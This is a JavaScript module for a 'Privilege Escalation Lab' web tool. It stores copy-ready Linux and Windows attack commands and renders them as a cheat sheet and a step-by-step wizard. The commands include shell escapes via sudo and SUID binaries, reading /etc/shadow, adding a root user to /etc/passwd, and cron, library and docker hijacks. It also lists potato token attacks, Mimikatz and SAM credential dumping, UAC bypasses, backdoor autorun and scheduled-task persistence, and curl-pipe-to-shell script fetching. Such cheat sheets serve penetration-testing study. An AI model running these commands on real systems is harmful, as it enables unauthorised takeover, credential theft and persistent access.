/* ==================== PRIVILEGE ESCALATION LAB ⬆️👑 ==================== */
/* Linux & Windows PrivEsc Techniques, Checklists & Commands */

window.PrivEscLab = {
    // --- STATE ---
    currentTab: 'linux',
    currentCategory: 'enumeration',

    // --- LINUX PRIVESC ---
    linuxTechniques: {
        enumeration: [
            { name: 'System Info', cmd: 'uname -a && cat /etc/*release*', desc: 'Get kernel and OS version' },
            { name: 'Current User', cmd: 'id && whoami', desc: 'Get current user context' },
            { name: 'Sudo Permissions', cmd: 'sudo -l', desc: 'List sudo privileges' },
            { name: 'SUID Binaries', cmd: 'find / -perm -4000 -type f 2>/dev/null', desc: 'Find SUID executables' },
            { name: 'SGID Binaries', cmd: 'find / -perm -2000 -type f 2>/dev/null', desc: 'Find SGID executables' },
            { name: 'Writable Dirs', cmd: 'find / -writable -type d 2>/dev/null', desc: 'Find world-writable directories' },
            { name: 'Cron Jobs', cmd: 'cat /etc/crontab && ls -la /etc/cron.*', desc: 'Check scheduled tasks' },
            { name: 'Running Processes', cmd: 'ps aux | grep root', desc: 'Find processes running as root' },
            { name: 'Network Info', cmd: 'netstat -tulpn || ss -tulpn', desc: 'Check listening ports' },
            { name: 'Users & Groups', cmd: 'cat /etc/passwd && cat /etc/group', desc: 'List all users and groups' }
        ],
        suid: [
            { name: 'Find (Read Files)', cmd: 'find . -exec cat /etc/shadow \\;', desc: 'SUID find - read protected files' },
            { name: 'Vim', cmd: 'vim -c \':!sh\'', desc: 'Escape to shell from vim' },
            { name: 'Nmap (old)', cmd: 'nmap --interactive\\n!sh', desc: 'Old nmap interactive mode' },
            { name: 'Python', cmd: 'python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', desc: 'Python shell spawn' },
            { name: 'Bash', cmd: 'bash -p', desc: 'Bash with preserved privileges' },
            { name: 'Less/More', cmd: 'less /etc/passwd\\n!/bin/sh', desc: 'Shell escape from pager' },
            { name: 'Awk', cmd: 'awk \'BEGIN {system("/bin/sh")}\'', desc: 'Awk shell execution' },
            { name: 'Perl', cmd: 'perl -e \'exec "/bin/sh";\'', desc: 'Perl shell exec' }
        ],
        sudo: [
            { name: 'Sudo Shell', cmd: 'sudo /bin/bash', desc: 'Direct shell if allowed' },
            { name: 'Sudo Vim', cmd: 'sudo vim -c \':!bash\'', desc: 'Vim shell escape' },
            { name: 'Sudo Find', cmd: 'sudo find / -exec /bin/bash \\;', desc: 'Find shell execution' },
            { name: 'Sudo Awk', cmd: 'sudo awk \'BEGIN {system("/bin/bash")}\'', desc: 'Awk shell execution' },
            { name: 'Sudo Env', cmd: 'sudo env /bin/bash', desc: 'Env command for shell' },
            { name: 'Sudo Python', cmd: 'sudo python -c \'import pty; pty.spawn("/bin/bash")\'', desc: 'Python PTY spawn' },
            { name: 'Sudo Nmap', cmd: 'echo "os.execute(\'/bin/bash\')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse', desc: 'Nmap NSE script' },
            { name: 'Sudo Less', cmd: 'sudo less /var/log/syslog\\n!/bin/bash', desc: 'Less shell escape' }
        ],
        kernel: [
            { name: 'Dirty COW (CVE-2016-5195)', cmd: 'searchsploit dirty cow', desc: 'Race condition exploit (2.6.22 < 4.8.3)' },
            { name: 'Dirty Pipe (CVE-2022-0847)', cmd: 'searchsploit dirty pipe', desc: 'Kernel 5.8+ pipe exploit' },
            { name: 'PwnKit (CVE-2021-4034)', cmd: 'searchsploit pwnkit', desc: 'Polkit pkexec exploit' },
            { name: 'Check Kernel', cmd: 'uname -r', desc: 'Get kernel version for exploit matching' },
            { name: 'Linux Exploit Suggester', cmd: 'wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh && chmod +x les.sh && ./les.sh', desc: 'Auto suggest exploits' },
            { name: 'Baron Samedit (CVE-2021-3156)', cmd: 'searchsploit baron samedit', desc: 'Sudo heap overflow' },
            { name: 'Overlay FS (CVE-2021-3493)', cmd: 'searchsploit overlayfs', desc: 'OverlayFS privesc' }
        ],
        cron: [
            { name: 'View Crontab', cmd: 'cat /etc/crontab', desc: 'View system cron jobs' },
            { name: 'List Cron.d', cmd: 'ls -la /etc/cron.d/', desc: 'List cron.d directory' },
            { name: 'User Crontabs', cmd: 'ls -la /var/spool/cron/crontabs/', desc: 'User crontabs' },
            { name: 'pspy Monitor', cmd: './pspy64', desc: 'Monitor cron without root (pspy)' },
            { name: 'Writable Cron Script', cmd: 'echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /path/to/script.sh', desc: 'Inject into writable cron script' },
            { name: 'Cron PATH Hijack', cmd: 'echo "#!/bin/bash\\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /tmp/script.sh', desc: 'PATH-based cron hijack' },
            { name: 'Cron Wildcard', cmd: 'echo "" > "--checkpoint-action=exec=sh shell.sh"', desc: 'Tar wildcard injection in cron' }
        ],
        library: [
            { name: 'LD_PRELOAD', cmd: 'sudo LD_PRELOAD=/tmp/evil.so <allowed_cmd>', desc: 'Preload malicious library' },
            { name: 'Compile Evil .so', cmd: 'gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles', desc: 'Create malicious shared object' },
            { name: 'LD_LIBRARY_PATH', cmd: 'export LD_LIBRARY_PATH=/tmp', desc: 'Hijack library search path' },
            { name: 'RPATH Hijack', cmd: 'ldd /usr/bin/target | grep "not found"', desc: 'Find missing libraries' },
            { name: 'Python Library', cmd: 'export PYTHONPATH=/tmp:$PYTHONPATH', desc: 'Python module hijacking' },
            { name: 'Ruby Gem Path', cmd: 'export GEM_PATH=/tmp:$GEM_PATH', desc: 'Ruby gem hijacking' }
        ],
        containers: [
            { name: 'Docker Group', cmd: 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh', desc: 'Escape if in docker group' },
            { name: 'Docker Socket', cmd: 'docker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt', desc: 'Use exposed docker socket' },
            { name: 'LXD/LXC Escape', cmd: 'lxc init ubuntu:18.04 privesc -c security.privileged=true', desc: 'LXD group exploitation' },
            { name: 'Kubernetes Pod', cmd: 'kubectl auth can-i --list', desc: 'Check K8s permissions' },
            { name: 'CAP_SYS_ADMIN', cmd: 'capsh --print', desc: 'Check for dangerous capabilities' },
            { name: 'Privileged Container', cmd: 'fdisk -l', desc: 'Check if privileged (can see host disks)' }
        ],
        misc: [
            { name: 'Capabilities', cmd: 'getcap -r / 2>/dev/null', desc: 'Find binaries with capabilities' },
            { name: 'NFS no_root_squash', cmd: 'showmount -e <target>', desc: 'Check NFS misconfig' },
            { name: 'PATH Injection', cmd: 'export PATH=/tmp:$PATH', desc: 'Hijack PATH variable' },
            { name: 'Writable /etc/passwd', cmd: 'echo "hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash" >> /etc/passwd', desc: 'Add root user' },
            { name: 'SSH Key', cmd: 'cat ~/.ssh/id_rsa', desc: 'Check for SSH private keys' },
            { name: 'History Files', cmd: 'cat ~/.bash_history ~/.mysql_history ~/.nano_history', desc: 'Check history for passwords' },
            { name: 'GTFOBins', cmd: 'https://gtfobins.github.io/', desc: 'Reference for SUID/sudo exploits' }
        ]
    },

    // --- WINDOWS PRIVESC ---
    windowsTechniques: {
        enumeration: [
            { name: 'System Info', cmd: 'systeminfo', desc: 'Get OS and patch info' },
            { name: 'Current User', cmd: 'whoami /all', desc: 'User, groups, privileges' },
            { name: 'Users', cmd: 'net user', desc: 'List local users' },
            { name: 'Admins', cmd: 'net localgroup administrators', desc: 'List admin group members' },
            { name: 'Network', cmd: 'ipconfig /all && netstat -ano', desc: 'Network configuration' },
            { name: 'Scheduled Tasks', cmd: 'schtasks /query /fo TABLE', desc: 'List scheduled tasks' },
            { name: 'Running Services', cmd: 'wmic service get name,pathname,startmode', desc: 'Service paths for hijacking' },
            { name: 'Installed Software', cmd: 'wmic product get name,version', desc: 'Check installed apps' },
            { name: 'AlwaysInstallElevated', cmd: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', desc: 'Check MSI privilege' },
            { name: 'Unquoted Paths', cmd: 'wmic service get name,pathname | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """', desc: 'Find unquoted service paths' }
        ],
        tokens: [
            { name: 'SeImpersonate', cmd: 'whoami /priv | findstr SeImpersonate', desc: 'Check for potato attacks' },
            { name: 'JuicyPotato', cmd: 'JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\path\\to\\shell.exe" -t *', desc: 'CLSID potato attack' },
            { name: 'PrintSpoofer', cmd: 'PrintSpoofer.exe -i -c cmd', desc: 'PrintSpoofer exploit' },
            { name: 'RoguePotato', cmd: 'RoguePotato.exe -r <attacker_ip> -e "cmd.exe /c whoami > c:\\output.txt" -l 9999', desc: 'Rogue potato attack' },
            { name: 'SweetPotato', cmd: 'SweetPotato.exe -a whoami', desc: 'Sweet potato token impersonation' },
            { name: 'GodPotato', cmd: 'GodPotato.exe -cmd "cmd /c whoami"', desc: 'Works on all Windows versions' },
            { name: 'EfsPotato', cmd: 'EfsPotato.exe "whoami"', desc: 'EFS-based potato attack' },
            { name: 'SeBackupPrivilege', cmd: 'whoami /priv | findstr SeBackup', desc: 'Check backup privilege for file access' }
        ],
        services: [
            { name: 'Check Service Perms', cmd: 'accesschk.exe /accepteula -uwcqv "Everyone" *', desc: 'Find weak service permissions' },
            { name: 'Modify Service', cmd: 'sc config <service> binPath= "C:\\shell.exe"', desc: 'Change service binary path' },
            { name: 'Restart Service', cmd: 'net stop <service> && net start <service>', desc: 'Restart to trigger payload' },
            { name: 'Create Service', cmd: 'sc create evil binPath= "C:\\shell.exe" start= auto', desc: 'Create malicious service' },
            { name: 'DLL Hijacking', cmd: 'copy shell.dll C:\\Program Files\\App\\missing.dll', desc: 'Plant malicious DLL' },
            { name: 'Binary Hijacking', cmd: 'icacls "C:\\Program Files\\Service\\service.exe"', desc: 'Check if binary is writable' },
            { name: 'Unquoted Path Abuse', cmd: 'copy shell.exe "C:\\Program Files\\Some.exe"', desc: 'Exploit unquoted service path' }
        ],
        schtask: [
            { name: 'List Tasks', cmd: 'schtasks /query /fo LIST /v', desc: 'Verbose task listing' },
            { name: 'Writable Task', cmd: 'accesschk.exe /accepteula -dqv "C:\\Task\\script.bat"', desc: 'Check task file permissions' },
            { name: 'Modify Task', cmd: 'schtasks /change /tn "TaskName" /tr "C:\\shell.exe"', desc: 'Change task executable' },
            { name: 'Create Task', cmd: 'schtasks /create /tn "Backdoor" /tr "C:\\shell.exe" /sc onlogon /ru SYSTEM', desc: 'Create SYSTEM task' }
        ],
        credentials: [
            { name: 'SAM & SYSTEM', cmd: 'reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM system.bak', desc: 'Dump SAM database' },
            { name: 'Mimikatz', cmd: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"', desc: 'Dump credentials from memory' },
            { name: 'Cached Creds', cmd: 'cmdkey /list', desc: 'Stored credentials' },
            { name: 'WiFi Passwords', cmd: 'netsh wlan show profile && netsh wlan show profile <SSID> key=clear', desc: 'Extract WiFi passwords' },
            { name: 'Autologon', cmd: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"', desc: 'Check for stored autologon creds' },
            { name: 'Unattend.xml', cmd: 'findstr /si password *.xml *.ini *.txt', desc: 'Search for password in files' },
            { name: 'DPAPI Decrypt', cmd: 'mimikatz.exe "dpapi::cred /in:C:\\Users\\user\\AppData\\..."', desc: 'Decrypt DPAPI credentials' },
            { name: 'LaZagne', cmd: 'lazagne.exe all', desc: 'Auto extract all credentials' },
            { name: 'Browser Creds', cmd: 'SharpWeb.exe all', desc: 'Extract browser credentials' }
        ],
        registry: [
            { name: 'AutoRun', cmd: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', desc: 'Check autorun keys' },
            { name: 'Writable AutoRun', cmd: 'accesschk.exe /accepteula -wvu HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', desc: 'Check autorun permissions' },
            { name: 'Add AutoRun', cmd: 'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "C:\\shell.exe"', desc: 'Add persistence' }
        ],
        uac: [
            { name: 'Check UAC', cmd: 'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', desc: 'UAC settings' },
            { name: 'Fodhelper', cmd: 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d "cmd.exe" /f && fodhelper', desc: 'Fodhelper UAC bypass' },
            { name: 'Eventvwr', cmd: 'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d "cmd.exe" /f && eventvwr', desc: 'Event viewer bypass' },
            { name: 'ComputerDefaults', cmd: 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d "cmd.exe" /f && computerdefaults', desc: 'ComputerDefaults bypass' },
            { name: 'UACME', cmd: 'UACME.exe <method_number> C:\\shell.exe', desc: 'UACME bypass framework' }
        ]
    },

    // --- AUTO SCRIPTS ---
    autoScripts: {
        linux: [
            { name: 'LinPEAS', url: 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
            { name: 'LinEnum', url: 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh', cmd: 'wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh' },
            { name: 'Linux Smart Enum', url: 'https://github.com/diego-treitos/linux-smart-enumeration', cmd: 'curl https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh | bash' },
            { name: 'pspy', url: 'https://github.com/DominicBreuker/pspy', cmd: './pspy64' }
        ],
        windows: [
            { name: 'WinPEAS', url: 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe', cmd: 'winPEASany.exe' },
            { name: 'PowerUp', url: 'https://github.com/PowerShellMafia/PowerSploit', cmd: 'Import-Module .\\PowerUp.ps1; Invoke-AllChecks' },
            { name: 'Seatbelt', url: 'https://github.com/GhostPack/Seatbelt', cmd: 'Seatbelt.exe -group=all' },
            { name: 'SharpUp', url: 'https://github.com/GhostPack/SharpUp', cmd: 'SharpUp.exe' }
        ]
    },

    // --- RENDER ---
    render() {
        return `
            <div class="privesc-app fade-in">
                <div class="privesc-header">
                    <div class="header-left">
                        <h1><i class="fas fa-crown"></i> Privilege Escalation Lab <span class="v2-tag">V2</span></h1>
                        <p class="subtitle">Linux & Windows PrivEsc Techniques</p>
                    </div>
                </div>

                <div class="privesc-tabs">
                    <div class="tab ${this.currentTab === 'pathfinder' ? 'active' : ''}" onclick="PrivEscLab.switchTab('pathfinder')">
                        <i class="fas fa-compass"></i> Pathfinder
                    </div>
                    <div class="tab ${this.currentTab === 'linux' ? 'active' : ''}" onclick="PrivEscLab.switchTab('linux')">
                        <i class="fab fa-linux"></i> Linux
                    </div>
                    <div class="tab ${this.currentTab === 'windows' ? 'active' : ''}" onclick="PrivEscLab.switchTab('windows')">
                        <i class="fab fa-windows"></i> Windows
                    </div>
                    <div class="tab ${this.currentTab === 'scripts' ? 'active' : ''}" onclick="PrivEscLab.switchTab('scripts')">
                        <i class="fas fa-robot"></i> Auto Scripts
                    </div>
                    <div class="tab ${this.currentTab === 'checklist' ? 'active' : ''}" onclick="PrivEscLab.switchTab('checklist')">
                        <i class="fas fa-tasks"></i> Checklist
                    </div>
                </div>

                <div class="privesc-content">
                    ${this.renderTabContent()}
                </div>
            </div>
            ${this.getStyles()}
        `;
    },

    renderTabContent() {
        switch (this.currentTab) {
            case 'pathfinder': return this.renderPathfinder();
            case 'linux': return this.renderLinux();
            case 'windows': return this.renderWindows();
            case 'scripts': return this.renderScripts();
            case 'checklist': return this.renderChecklist();
            default: return '';
        }
    },

    // --- PATHFINDER WIZARD ---
    pathfinderState: {
        step: 0,
        os: null,
        access: null,
        history: []
    },

    resetPathfinder() {
        this.pathfinderState = { step: 0, os: null, access: null, history: [] };
        this.reRender();
    },

    pathfinderNext(key, value) {
        this.pathfinderState.history.push({ step: this.pathfinderState.step, choice: value });

        if (this.pathfinderState.step === 0) {
            this.pathfinderState.os = value;
            this.pathfinderState.step = 1;
        } else if (this.pathfinderState.step === 1) {
            this.pathfinderState.access = value;
            this.pathfinderState.step = 2;
        } else if (this.pathfinderState.step === 2) {
            this.pathfinderState.step = 3; // Result
            this.pathfinderState.finalChoice = value;
        }
        this.reRender();
    },

    renderPathfinder() {
        const s = this.pathfinderState;

        // Step 0: Select OS
        if (s.step === 0) {
            return `
                <div class="pathfinder-container fade-in-up">
                    <div class="pf-header">
                        <h2><i class="fas fa-compass"></i> PrivEsc Pathfinder</h2>
                        <p>Answer a few questions to identify the best escalation vector.</p>
                    </div>
                    <div class="pf-question">
                        <h3>1. What Operating System is the target?</h3>
                        <div class="pf-options">
                            <button class="pf-btn linux" onclick="PrivEscLab.pathfinderNext('os', 'linux')"><i class="fab fa-linux"></i> Linux</button>
                            <button class="pf-btn windows" onclick="PrivEscLab.pathfinderNext('os', 'windows')"><i class="fab fa-windows"></i> Windows</button>
                        </div>
                    </div>
                </div>`;
        }

        // Step 1: Access Level
        if (s.step === 1) {
            return `
                <div class="pathfinder-container fade-in-up">
                    <div class="pf-header"> <button class="pf-back" onclick="PrivEscLab.resetPathfinder()"><i class="fas fa-arrow-left"></i> Restart</button> </div>
                    <div class="pf-question">
                        <h3>2. What type of access do you currently have?</h3>
                        <div class="pf-options">
                            <button class="pf-btn" onclick="PrivEscLab.pathfinderNext('access', 'webshell')">
                                <i class="fas fa-globe"></i> Web Shell / RCE
                                <small>Limited interactivity, no TTY</small>
                            </button>
                            <button class="pf-btn" onclick="PrivEscLab.pathfinderNext('access', 'user')">
                                <i class="fas fa-user"></i> User Shell
                                <small>SSH or stable Reverse Shell</small>
                            </button>
                        </div>
                    </div>
                </div>`;
        }

        // Step 2: Context Specific
        if (s.step === 2) {
            const isLinux = s.os === 'linux';
            return `
                <div class="pathfinder-container fade-in-up">
                    <div class="pf-header"> <button class="pf-back" onclick="PrivEscLab.resetPathfinder()"><i class="fas fa-arrow-left"></i> Restart</button> </div>
                    <div class="pf-question">
                        <h3>3. Context Check</h3>
                        <div class="pf-options">
                            ${isLinux ? `
                                <button class="pf-btn" onclick="PrivEscLab.pathfinderNext('ctx', 'sudo')"><i class="fas fa-key"></i> I have the user's password</button>
                                <button class="pf-btn" onclick="PrivEscLab.pathfinderNext('ctx', 'automated')"><i class="fas fa-robot"></i> I want to run auto-scripts</button>
                                <button class="pf-btn" onclick="PrivEscLab.pathfinderNext('ctx', 'manual')"><i class="fas fa-search"></i> Manual Enumeration</button>
                            ` : `
                                <button class="pf-btn" onclick="PrivEscLab.pathfinderNext('ctx', 'potato')"><i class="fas fa-server"></i> Service Account (IIS/SQL)</button>
                                <button class="pf-btn" onclick="PrivEscLab.pathfinderNext('ctx', 'automated')"><i class="fas fa-robot"></i> I want to run auto-scripts</button>
                                <button class="pf-btn" onclick="PrivEscLab.pathfinderNext('ctx', 'manual')"><i class="fas fa-search"></i> Manual Enumeration</button>
                            `}
                        </div>
                    </div>
                </div>`;
        }

        // Step 3: Recommendation
        if (s.step === 3) {
            return this.renderPathfinderResult();
        }
    },

    renderPathfinderResult() {
        const s = this.pathfinderState;
        let title = "Recommended Path";
        let steps = [];

        // LOGIC ENGINE
        if (s.os === 'linux') {
            if (s.finalChoice === 'sudo') {
                title = "Sudo Abuse or Reuse";
                steps.push({ name: 'Check Sudo Usage', cmd: 'sudo -l', desc: 'First check if you can run anything as root.' });
                steps.push({ name: 'Sudo Re-use', cmd: 'sudo -i', desc: 'Try reusing the password for root shell.' });
            } else if (s.finalChoice === 'automated') {
                title = "Automated Enumeration";
                steps.push({ name: 'LinPEAS', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', desc: 'Run the ultimate enumeration script.' });
            } else {
                title = "Manual Enumeration Flow";
                steps.push({ name: 'SUID Binaries', cmd: 'find / -perm -4000 -type f 2>/dev/null', desc: 'Look for SUID binaries (standard).' });
                steps.push({ name: 'Capabilities', cmd: 'getcap -r / 2>/dev/null', desc: 'Check for hidden capabilities.' });
                steps.push({ name: 'Cron Jobs', cmd: 'cat /etc/crontab', desc: 'Check for scheduled tasks running as root.' });
            }
        } else {
            // Windows
            if (s.finalChoice === 'potato') {
                title = "Potato Attacks (SeImpersonate)";
                steps.push({ name: 'Check Privs', cmd: 'whoami /priv', desc: 'Look for SeImpersonatePrivilege.' });
                steps.push({ name: 'SweetPotato', cmd: 'SweetPotato.exe -a whoami', desc: 'Try SweetPotato to escalate to SYSTEM.' });
            } else if (s.finalChoice === 'automated') {
                title = "Automated Enumeration";
                steps.push({ name: 'WinPEAS', cmd: 'winPEASany.exe', desc: 'Run WinPEAS to find all weakness.' });
            } else {
                title = "Manual Enumeration Flow";
                steps.push({ name: 'System Info', cmd: 'systeminfo', desc: 'Check OS version and patches.' });
                steps.push({ name: 'Unquoted Service Paths', cmd: 'wmic service get name,pathname | findstr /i /v "C:\\Windows\\\\"', desc: 'Find broken service paths.' });
                steps.push({ name: 'AlwaysInstallElevated', cmd: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', desc: 'Check for MSI installer exploit.' });
            }
        }

        return `
            <div class="pathfinder-container fade-in-up">
                <div class="pf-header"> 
                    <button class="pf-back" onclick="PrivEscLab.resetPathfinder()"><i class="fas fa-arrow-left"></i> Start Over</button> 
                    <div class="pf-result-title">
                        <h2><i class="fas fa-flag-checkered"></i> ${title}</h2>
                        <span class="v2-tag">Confidence: High</span>
                    </div>
                </div>
                
                <div class="pf-results">
                    ${steps.map(step => `
                        <div class="pf-step-card">
                            <div class="step-head">
                                <strong>${step.name}</strong>
                                <span>${step.desc}</span>
                            </div>
                            <div class="step-cmd">
                                <code>${step.cmd}</code>
                                <button onclick="navigator.clipboard.writeText(\`${step.cmd}\`)"><i class="fas fa-copy"></i></button>
                            </div>
                        </div>
                    `).join('')}
                </div>
                
                <div class="pf-footer">
                    <p><i class="fas fa-info-circle"></i> If these fail, switch to the <strong>Checklist</strong> tab for a comprehensive review.</p>
                </div>
            </div>`;
    },

    // ... (Old render methods: renderLinux, renderWindows, etc.) ...

    renderLinux() {
        const categories = Object.keys(this.linuxTechniques);
        return `
            <div class="techniques-section">
                <div class="category-nav">
                    ${categories.map(c => `
                        <button class="${this.currentCategory === c ? 'active' : ''}" onclick="PrivEscLab.switchCategory('${c}')">
                            ${c.charAt(0).toUpperCase() + c.slice(1)}
                        </button>
                    `).join('')}
                </div>
                <div class="commands-list">
                    ${this.linuxTechniques[this.currentCategory].map(t => `
                        <div class="command-card">
                            <div class="cmd-header">
                                <span class="cmd-name">${t.name}</span>
                                <span class="cmd-desc">${t.desc}</span>
                            </div>
                            <div class="cmd-code">
                                <code>${this.escapeHtml(t.cmd)}</code>
                                <button onclick="navigator.clipboard.writeText(\`${t.cmd.replace(/`/g, '\\`').replace(/\\/g, '\\\\')}\`)"><i class="fas fa-copy"></i></button>
                            </div>
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
    },

    renderWindows() {
        const categories = Object.keys(this.windowsTechniques);
        return `
            <div class="techniques-section">
                <div class="category-nav">
                    ${categories.map(c => `
                        <button class="${this.currentCategory === c ? 'active' : ''}" onclick="PrivEscLab.switchCategory('${c}')">
                            ${c.charAt(0).toUpperCase() + c.slice(1)}
                        </button>
                    `).join('')}
                </div>
                <div class="commands-list">
                    ${(this.windowsTechniques[this.currentCategory] || this.windowsTechniques.enumeration).map(t => `
                        <div class="command-card">
                            <div class="cmd-header">
                                <span class="cmd-name">${t.name}</span>
                                <span class="cmd-desc">${t.desc}</span>
                            </div>
                            <div class="cmd-code">
                                <code>${this.escapeHtml(t.cmd)}</code>
                                <button onclick="navigator.clipboard.writeText(\`${t.cmd.replace(/`/g, '\\`').replace(/\\/g, '\\\\')}\`)"><i class="fas fa-copy"></i></button>
                            </div>
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
    },

    renderScripts() {
        return `
            <div class="scripts-section">
                <div class="scripts-grid">
                    <div class="scripts-col">
                        <h3><i class="fab fa-linux"></i> Linux</h3>
                        ${this.autoScripts.linux.map(s => `
                            <div class="script-card">
                                <h4>${s.name}</h4>
                                <code>${s.cmd}</code>
                                <div class="script-actions">
                                    <button onclick="navigator.clipboard.writeText(\`${s.cmd}\`)"><i class="fas fa-copy"></i> Copy</button>
                                    <a href="${s.url}" target="_blank"><i class="fas fa-external-link-alt"></i></a>
                                </div>
                            </div>
                        `).join('')}
                    </div>
                    <div class="scripts-col">
                        <h3><i class="fab fa-windows"></i> Windows</h3>
                        ${this.autoScripts.windows.map(s => `
                            <div class="script-card">
                                <h4>${s.name}</h4>
                                <code>${s.cmd}</code>
                                <div class="script-actions">
                                    <button onclick="navigator.clipboard.writeText(\`${s.cmd}\`)"><i class="fas fa-copy"></i> Copy</button>
                                    <a href="${s.url}" target="_blank"><i class="fas fa-external-link-alt"></i></a>
                                </div>
                            </div>
                        `).join('')}
                    </div>
                </div>
            </div>
        `;
    },

    renderChecklist() {
        return `
            <div class="checklist-section">
                <div class="checklist-grid">
                    <div class="checklist-col">
                        <h3><i class="fab fa-linux"></i> Linux Checklist</h3>
                        <div class="checklist-items">
                            <label><input type="checkbox"> Check sudo -l permissions</label>
                            <label><input type="checkbox"> Find SUID/SGID binaries</label>
                            <label><input type="checkbox"> Check cron jobs</label>
                            <label><input type="checkbox"> Look for writable scripts in cron</label>
                            <label><input type="checkbox"> Check capabilities (getcap)</label>
                            <label><input type="checkbox"> Enumerate running processes</label>
                            <label><input type="checkbox"> Check for kernel exploits</label>
                            <label><input type="checkbox"> Look for sensitive files (passwords, keys)</label>
                            <label><input type="checkbox"> Check for docker/lxd group membership</label>
                            <label><input type="checkbox"> Check NFS exports</label>
                            <label><input type="checkbox"> Look for writable /etc/passwd</label>
                            <label><input type="checkbox"> Check PATH hijacking opportunities</label>
                            <label><input type="checkbox"> Run LinPEAS</label>
                        </div>
                    </div>
                    <div class="checklist-col">
                        <h3><i class="fab fa-windows"></i> Windows Checklist</h3>
                        <div class="checklist-items">
                            <label><input type="checkbox"> Check whoami /priv (SeImpersonate)</label>
                            <label><input type="checkbox"> Look for unquoted service paths</label>
                            <label><input type="checkbox"> Check AlwaysInstallElevated</label>
                            <label><input type="checkbox"> Enumerate scheduled tasks</label>
                            <label><input type="checkbox"> Check weak service permissions</label>
                            <label><input type="checkbox"> Look for stored credentials</label>
                            <label><input type="checkbox"> Check for autologon credentials</label>
                            <label><input type="checkbox"> Search for passwords in files</label>
                            <label><input type="checkbox"> Check UAC level and bypasses</label>
                            <label><input type="checkbox"> Look for DLL hijacking opportunities</label>
                            <label><input type="checkbox"> Run WinPEAS</label>
                            <label><input type="checkbox"> Check for potato attacks</label>
                        </div>
                    </div>
                </div>
            </div>
        `;
    },

    // --- ACTIONS ---
    switchTab(tab) {
        this.currentTab = tab;
        this.currentCategory = tab === 'windows' ? 'enumeration' : 'enumeration';
        this.reRender();
    },

    switchCategory(cat) {
        this.currentCategory = cat;
        this.reRender();
    },

    escapeHtml(str) {
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    },

    reRender() {
        const app = document.querySelector('.privesc-app');
        if (app) app.outerHTML = this.render();
    },

    getStyles() {
        return `<style>
            .privesc-app { min-height: calc(100vh - 60px); background: linear-gradient(135deg, #0a0a12 0%, #1a1a2e 100%); color: #e0e0e0; padding: 25px; font-family: 'Segoe UI', sans-serif; }
            .privesc-header { margin-bottom: 20px; }
            .privesc-header h1 { margin: 0; color: #ffd700; font-size: 1.8rem; }
            .privesc-header .subtitle { color: #888; margin: 5px 0 0; }

            .privesc-tabs { display: flex; gap: 5px; margin-bottom: 20px; }
            .tab { padding: 10px 18px; border-radius: 8px; cursor: pointer; transition: 0.2s; color: #888; display: flex; align-items: center; gap: 8px; }
            .tab:hover { color: #fff; background: rgba(255,255,255,0.05); }
            .tab.active { background: #ffd700; color: #000; }

            .category-nav { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
            .category-nav button { padding: 8px 16px; background: rgba(255,255,255,0.05); border: 1px solid #333; border-radius: 20px; color: #aaa; cursor: pointer; transition: 0.2s; }
            .category-nav button:hover { border-color: #ffd700; color: #ffd700; }
            .category-nav button.active { background: #ffd700; color: #000; border-color: #ffd700; }

            .commands-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 15px; }
            .command-card { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 12px; }
            .cmd-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
            .cmd-name { color: #ffd700; font-weight: bold; }
            .cmd-desc { color: #666; font-size: 0.85rem; }
            .cmd-code { display: flex; align-items: center; gap: 10px; background: #0a0a12; padding: 12px; border-radius: 8px; }
            .cmd-code code { flex: 1; color: #2ecc71; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; word-break: break-all; }
            .cmd-code button { background: transparent; border: none; color: #666; cursor: pointer; }
            .cmd-code button:hover { color: #ffd700; }

            .scripts-section { padding: 20px 0; }
            .scripts-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 30px; }
            .scripts-col h3 { color: #ffd700; margin: 0 0 20px; }
